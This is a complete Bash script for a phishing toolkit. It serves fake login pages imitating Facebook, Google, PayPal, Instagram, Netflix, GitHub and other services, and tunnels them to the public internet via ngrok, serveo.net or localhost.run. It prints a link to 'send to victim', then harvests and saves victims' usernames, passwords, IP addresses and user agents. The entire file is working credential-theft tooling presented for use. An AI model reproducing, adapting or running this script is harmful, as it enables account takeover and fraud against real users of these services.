trap 'printf "\n";stop;exit 1' 2
depen() {
    command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
    command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
    command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
}
banner() {
    clear
    printf "\n"
    printf "\n"
    printf "\e[32;1m███████████ █████  █████████  █████   █████    █████ █████\e[0m\n"
    printf "\e[32;1m░███░░░░░░█░░███  ███░░░░░███░░███   ░░███    ░░███ ░░███\e[0m\n"
    printf "\e[32;1m░███   █ ░  ░███ ░███    ░░░  ░███    ░███     ░░███ ███\e[0m\n"  
    printf "\e[32;1m░███████    ░███ ░░█████████  ░███████████      ░░█████\e[0m\n"   
    printf "\e[32;1m░███░░░█    ░███  ░░░░░░░░███ ░███░░░░░███       ███░███\e[0m\n"  
    printf "\e[32;1m░███  ░     ░███  ███    ░███ ░███    ░███      ███ ░░███\e[0m\n" 
    printf "\e[32;1m█████       █████░░█████████  █████   █████    █████ █████\e[0m\n"
    printf "\e[33;1m░░░░░       ░░░░░  ░░░░░░░░░  ░░░░░   ░░░░░    ░░░░░ ░░░░░\e[1;94m    Version 1.0      \e[0m\n"
    printf "\n"
    printf " \e[91m[\e[37;1m+\e[91m]\e[0m\e[34;1m Tool Created by OB1T0-17 (BENYAMIN)\e[0m\n"
    printf " \n"
    printf " \e[36;1m.:. SELECT ATTACK => .:.\e[0m\n"
    printf " \n"
}
menu() {
    printf " \e[1;31m       [\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook \e[0m\e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Instagram\e[0m\n"
    printf " \e[1;31m       [\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Google   \e[0m\e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Netflix\e[0m\n"
    printf " \e[1;31m       [\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Paypal   \e[0m\e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m Snapchat\e[0m\n"
    printf " \e[1;31m       [\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Spotify  \e[0m\e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m Github\e[0m\n"
    printf " \e[1;31m       [\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Twitter  \e[0m\e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Exit(Salir)\e[0m\n"
    printf "\n"
    read -p $' \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
    if [[ $option == 1 || $option == 01 ]]; then
    facebook
    elif [[ $option == 2 || $option == 02 ]]; then
    gmail
    elif [[ $option == 3 || $option == 03 ]]; then
    server="paypal"
    start
    elif [[ $option == 4 || $option == 04 ]]; then
    server="spotify"
    start
    elif [[ $option == 5 || $option == 05 ]]; then
    server="twitter"
    start
    elif [[ $option == 6 || $option == 06 ]]; then
    instagram
    elif [[ $option == 7 || $option == 07 ]]; then
    server="netflix"
    start
    elif [[ $option == 8 || $option == 08 ]]; then
    server="snapchat"
    start
    elif [[ $option == 9 || $option == 09 ]]; then
    server="github"
    start
    elif [[ $option == 10 ]]; then
    exit 1
    else
    printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
    sleep 1
    banner
    menu
    fi
}
facebook(){
    printf " \n"
    printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
    printf "\e[0m\n"
    read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
    if [[ $option == 1 || $option == 01 ]]; then
    server="facebook"
    start
    elif [[ $option == 2 || $option == 02 ]]; then
    server="fb_advanced"
    start
    elif [[ $option == 3 || $option == 03 ]]; then
    server="fb_security"
    start
    elif [[ $option == 4 || $option == 04 ]]; then
    server="fb_messenger"
    start
    else
    printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
    sleep 1
    banner
    menu
    fi
}
instagram(){
    printf " \n"
    printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
    printf "\e[0m\n"
    read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
    if [[ $option == 1 || $option == 01 ]]; then
    server="instagram"
    start
    elif [[ $option == 2 || $option == 02 ]]; then
    server="ig_followers"
    start
    elif [[ $option == 3 || $option == 03 ]]; then
    server="ig_verify"
    start
    else
    printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
    sleep 1
    banner
    menu
    fi
}
gmail(){
    printf " \n"
    printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Old Login Page\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail New Login Page\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
    printf "\e[0m\n"
    read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
    if [[ $option == 1 || $option == 01 ]]; then
    server="google"
    start
    elif [[ $option == 2 || $option == 02 ]]; then
    server="google_new"
    start
    elif [[ $option == 3 || $option == 03 ]]; then
    server="google_poll"
    start
    else
    printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
    sleep 1
    banner
    menu
    fi
}
stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
    fi
    if [[ $checkphp == *'php'* ]]; then
    pkill -f -2 php > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
    pkill -f -2 ssh > /dev/null 2>&1
    killall ssh > /dev/null 2>&1
    fi
    if [[ -e linksender ]]; then
    rm -rf linksender
    fi
}
start() {
    if [[ -e linksender ]]; then
    rm -rf linksender
    fi
    printf "\n"
    printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m LocalHost\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Ngrok.io\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Serveo.net\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Localhost.run\e[0m\n"
    d_o_server="2"
    printf "\n"
    read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' option_server
    option_server="${option_server:-${d_o_server}}"
    if [[ $option_server == 3 || $option_server == 03 ]]; then
    start_s
    elif [[ $option_server == 2 || $option_server == 02 ]]; then
    start_n
    elif [[ $option_server == 4 || $option_server == 04 ]]; then
    start_local
    elif [[ $option_server == 1 || $option_server == 01 ]]; then
    start_l
    else
    printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
    sleep 1
    banner
    start
    fi
}
start_s() {
    if [[ -e sites/$server/ip.txt ]]; then
    rm -rf sites/$server/ip.txt
    fi
    if [[ -e sites/$server/usernames.txt ]]; then
    rm -rf sites/$server/usernames.txt
    fi
    def_port="8080"
    printf "\e[0m\n"
    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
    read port
    port="${port:-${def_port}}"
    start_serveo
}
start_serveo() {
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
    sleep 2
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
    if [[ -e linksender ]]; then
    rm -rf linksender
    fi
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > linksender ' &
    printf "\n"
    sleep 7
    send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
    printf "\n"
    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $send_url
    printf "\n"
    found
}
start_n() {
    if [[ -e sites/$server/ip.txt ]]; then
    rm -rf sites/$server/ip.txt
    fi
    if [[ -e sites/$server/usernames.txt ]]; then
    rm -rf sites/$server/usernames.txt
    fi
    if [[ -e ngrok ]]; then
    echo ""
    else
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:5555\e[0m\e[1;92m)\e[0m\n"
    arch=$(uname -a | grep -o 'arm' | head -n1)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
    curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
    if [[ -e ngrok-stable-linux-arm.zip ]]; then
    unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
    chmod +x ngrok
    rm -rf ngrok-stable-linux-arm.zip
    else
    printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
    exit 1
    fi
    else
    curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
    if [[ -e ngrok-stable-linux-386.zip ]]; then
    unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
    chmod +x ngrok
    rm -rf ngrok-stable-linux-386.zip
    else
    printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
    exit 1
    fi
    fi
    fi
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
    cd sites/$server && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    sleep 2
    ./ngrok http 8080 > /dev/null 2>&1 &
    sleep 10
    link=$(curl -s -N http://127.0.0.1:8080/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
    found
}
start_local(){
    def_port="5555"
    printf "\e[0m\n"
    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
    read port
    port="${port:-${def_port}}"
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
    sleep 2
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
    printf "\n"
    if [[ -e linksender ]]; then
    rm -rf linksender
    fi
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
    printf "\e[1;93m\n"
    ssh -R 80:localhost:$port ssh.localhost.run 2>&1
    printf "\e[0m\n"
    printf "\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
    while [ true ]; do
    if [[ -e "sites/$server/ip.txt" ]]; then
    c_ip
    rm -rf sites/$server/ip.txt
    fi
    sleep 0.75
    if [[ -e "sites/$server/usernames.txt" ]]; then
    account=$(grep -o 'Username:.*' sites/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
    cat sites/$server/usernames.txt >> sites/$server/login_info.txt
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
    printf "\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
    rm -rf sites/$server/usernames.txt
    fi
    sleep 0.75
    done
}
start_l() {
    def_port="5555"
    printf "\e[0m\n"
    printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
    read port
    port="${port:-${def_port}}"
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
    cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
    sleep 2
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
    printf "\n"
    found
}
found() {
    printf "\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
    printf "\n"
    while [ true ]; do
    if [[ -e "sites/$server/ip.txt" ]]; then
    printf "\n"
    printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
    printf "\n"
    c_ip
    rm -rf sites/$server/ip.txt
    fi
    sleep 0.75
    if [[ -e "sites/$server/usernames.txt" ]]; then
    printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\n"
    printf "\n"
    c_cred
    rm -rf sites/$server/usernames.txt
    fi
    sleep 0.75
    done
}
c_ip() {
    touch sites/$server/login_info.txt
    ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/victim_ip.txt\e[0m\n" $server
    printf "\n"
    cat sites/$server/ip.txt >> sites/$server/victim_ip.txt
}
c_cred() {
    account=$(grep -o 'Username:.*' sites/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
    cat sites/$server/usernames.txt >> sites/$server/login_info.txt
    printf "\e[0m\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
    printf "\n"
    printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
}
banner
depen
menu